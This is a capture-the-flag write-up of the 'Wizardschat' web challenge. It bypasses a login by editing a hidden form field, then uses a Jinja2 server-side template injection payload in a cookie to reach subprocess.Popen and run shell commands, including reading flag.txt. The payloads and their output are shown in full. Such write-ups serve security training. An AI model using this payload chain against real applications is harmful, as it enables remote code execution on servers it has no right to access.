---
layout: menu
---

![Wizardschat (300 pts)](./screenshots/Wizardschat.png)

---

## CHALLENGE INFO
- __CHALLENGE LINK__: https://wizardschat.tghack.no/
- __LANDING PAGE__: https://wizardschat.tghack.no/login

  ![homepage](./screenshots/Wizardschat_home.png)

  - Page Source:
    ```html
    <html>
    <head>
    <title>WizardsChat</title>
    <body>
    <h1>Login</h1>
    <div>
        <strong>Muggles no access! Use your magic to login</strong>
    </div>
    <form method="POST" action="/login">
    <input type="hidden" name="has_magic" value="0" />
    Username: <input type="text" name="username" /><br />
    <input type="submit" value="Login" />
    </form>
    </body>
    </html>
    ```
- __ASSUMED OBJECTIVE__: Pass an appropriate __username__ to extract the flag

---

## STEP 1 : Bypass __*/login*__ page

- Failed login response:
  ```html
  <html>
  <head>
  <title>WizardsChat</title>
  <body>
  <h1>NO MAGIC DETECTED</h1>
  </body>
  </html>
  ```

- Change the value of __*has_magic*__ from 0 to 1:
  ```html
  <input type="hidden" name="has_magic" value="1" />
  ```

- Submit with __any__ username (for now):

  ![Wizardschat chat](./screenshots/Wizardschat_chat.png)

  __NOTE(S)__:
  - The chat filters __"<"__ and __">"__ to __\&lt;__ and __\&gt;__ respectively
  - The chat retains __\{\{ \}\}__ but does not interpret them.
  - The chat seems to be a rabbit hole.
    - All messages sent by users are output through the chat.
    - The __username__ and __message__ are exposed if it involves a payload. 

---

## STEP 2 : Test __username__ input for vulnerabilities
- Server-side Template Injection (SSTI)
  - Request:
    ```http
    GET / HTTP/1.1
    Host: wizardschat.tghack.no
    ...
    Cookie: username={&#123; self.__class__ }}
    ...
    ```
  - Rendered Response:
    ```html
    ...
        Username: <class 'jinja2.runtime.TemplateReference'>
    ...
    ```

  __NOTE__:
  - The site is vulnerable to __SSTI__
  - The templating language used is __Jinja2__

---

## STEP 3 : Create working payload  
1. Method Resolution Order ( \_\_mro\_\_ )
   - Request:
     ```http
     GET / HTTP/1.1
     Host: wizardschat.tghack.no
     ...
     Cookie: username={&#123; self.__class__.__mro__ }}
     ...
     ```
   - Rendered Response:
     ```html
     ...
         Username: (<class 'jinja2.runtime.TemplateReference'>, <class 'object'>)
     ...
     ```

   __Notes__:
   - __Method Resolution Order__ returns the order in which __base classes__ are searched
     - This applies for languages that use multiple inheritance
   - __\_\_mro\_\___ lets you go back __up__ the tree of __inherited objects__
   - `<class 'jinja2.runtime.TemplateReference'>` inherits from `<class 'object'>`

2. Searching for __subclasses__ ( \_\_subclasses\_\_() )
   - Request:
     ```http
     GET / HTTP/1.1
     Host: wizardschat.tghack.no
     ...
     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__() }}
     ...
     ```
   - Rendered Response:
     ```html
     ...
         Username: [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'functools.partialmethod'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class '_sre.SRE_Pattern'>, <class '_sre.SRE_Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.Pattern'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'queue.Queue'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'Struct'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class '_random.Random'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'textwrap.TextWrapper'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'waitress.utilities.Error'>, <class 'waitress.wasyncore.dispatcher'>, <class 'waitress.wasyncore.file_wrapper'>, <class 'waitress.trigger._triggerbase'>, <class 'gettext.NullTranslations'>, <class 'waitress.adjustments._bool_marker'>, <class 'waitress.adjustments.Adjustments'>, <class 'waitress.buffers.FileBasedBuffer'>, <class 'waitress.buffers.OverflowableBuffer'>, <class 'waitress.receiver.FixedStreamReceiver'>, <class 'waitress.receiver.ChunkedReceiver'>, <class 'waitress.parser.HTTPRequestParser'>, <class 'waitress.task.ThreadedTaskDispatcher'>, <class 'waitress.task.Task'>, <class 'waitress.channel.HTTPChannel'>, <class 'waitress.server.MultiSocketServer'>, <class 'waitress.server.BaseWSGIServer'>, <class '__future__._Feature'>, <class '_ast.AST'>, <class 'sqlite3.Row'>, <class 'sqlite3.Cursor'>, <class 'sqlite3.Connection'>, <class 'sqlite3Node'>, <class 'sqlite3.Cache'>, <class 'sqlite3.Statement'>, <class 'sqlite3.PrepareProtocol'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'mimetypes.MimeTypes'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'contextlib.ContextDecorator'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.urls.Href'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.middleware.dispatcher.DispatcherMiddleware'>, <class 'werkzeug.middleware.http_proxy.ProxyMiddleware'>, <class 'werkzeug.middleware.shared_data.SharedDataMiddleware'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.exceptions.Aborter'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'multiprocessing.process.BaseProcess'>, <class 'array.array'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class '_multiprocessing.SemLock'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'multiprocessing.connection.Listener'>, <class 'multiprocessing.connection.SocketListener'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'concurrent.futures.process._ExceptionWithTraceback'>, <class 'concurrent.futures.process._WorkItem'>, <class 'concurrent.futures.process._ResultItem'>, <class 'concurrent.futures.process._CallItem'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'asyncio.futures._TracebackLogger'>, <class 'asyncio.futures.Future'>, <class '_asyncio.Future'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class 'TaskWakeupMethWrapper'>, <class 'asyncio.locks._ContextManager'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.locks.Event'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.queues.Queue'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.transports.BaseTransport'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'uuid.UUID'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.Rule.BuilderCompiler'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.wrappers.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'unicodedata.UCD'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'jinja2.debug.TracebackFrameProxy'>, <class 'jinja2.debug.ProcessedTraceback'>]
     ...
     ```

   __Notes__:
   - __\_\_subclasses\_\_()__ lets you go __down__ the __inheritance tree__
   - `.__mro__[-1].__subclasses__()` returns an array of classes that could inherit from `<class 'object'>`

3. Find an exploitable subclass
   - Request:
     ```http
     GET / HTTP/1.1
     Host: wizardschat.tghack.no
     ...
     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__()[181] }}
     ...
     ```
   - Rendered Response:
     ```html
     ...
         Username: <class 'subprocess.Popen'>
     ...
     ```

   __Notes__:
   - `<class 'subprocess.Popen'>` is at index __*181*__
   - __subprocess.Popen__ could be used to execute __*shell commands*__

4. Attempt RCE (__*Remote Code Execution*__)
   - Request:
     ```http
     GET / HTTP/1.1
     Host: wizardschat.tghack.no
     ...
     Cookie: username={&#123; self.__class__.__mro__[-1].__subclasses__()[181]("id", shell=True, stdout=-1).communicate() }}
     ...
     ```
   - Rendered Response:
     ```html
     ...
         Username: (b'uid=100(appuser) gid=65533(nogroup) groups=65533(nogroup)\n', None)
     ...
     ```

   __Notes__:
   - The payload works
   - `Popen.communicate()` returns a tuple __*(stdout_data, stderr_data)*__

---

## Step 4 : Extract the flag

```sh
payload="{&#123; self.__class__.__mro__[-1].__subclasses__()[181](\"ls -la\", shell=True, stdout=-1).communicate() }}"
curl -b "username=$payload" https://wizardschat.tghack.no/ | sed -ne 's/^.*Username:\(.*\)$/&/p'

# total 28
# drwxr-xr-x    1 root     root        4.0K Apr 18 16:48 .
# drwxr-xr-x    1 root     root        4.0K Apr 18 16:48 ..
# -rwxr-xr-x    1 root     root          35 Apr 18 14:00 flag.txt
# -rwxr-xr-x    1 root     root         262 Apr 16 07:09 index.php
# -rwxr-xr-x    1 root     root        2.7K Apr 18 16:48 main.py
# -rwxr-xr-x    1 root     root          29 Apr 18 14:00 requirements.txt
# -rwxr-xr-x    1 root     root         827 Apr 16 07:09 upload.php

payload="{&#123; self.__class__.__mro__[-1].__subclasses__()[181](\"cat ./flag.txt\", shell=True, stdout=-1).communicate() }}"
curl -b "username=$payload" https://wizardschat.tghack.no/ | sed -ne 's/^.*Username:\(.*\)$/&/p'

# Username: (b&#39;TG19{templates_make_a_better_chat}\n&#39;, None)
```

---

## FLAG : __TG19&#123;templates_make_a_better_chat}__